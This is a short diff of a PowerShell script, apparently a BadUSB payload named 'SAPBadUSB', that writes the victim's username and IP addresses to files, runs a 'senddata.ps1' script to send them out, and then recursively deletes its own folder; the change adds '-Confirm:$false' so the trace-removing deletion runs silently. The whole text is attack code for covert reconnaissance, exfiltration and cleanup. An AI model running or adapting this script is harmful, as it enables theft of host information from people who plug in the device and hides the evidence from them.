@@ -4,5 +4,5 @@ whoami > whoami.txt
 Get-NetIPAddress > ipaddress.txt
 .\senddata.ps1
 cd ..\..
-Get-ChildItem -Path "SAPBadUSB" -Recurse | Remove-Item -force -recurse
-Remove-Item "SAPBadUSB" -Force
+Get-ChildItem -Path "SAPBadUSB" -Recurse -Confirm:$false | Remove-Item -force -recurse -Confirm:$false
+Remove-Item "SAPBadUSB" -Force -Confirm:$false
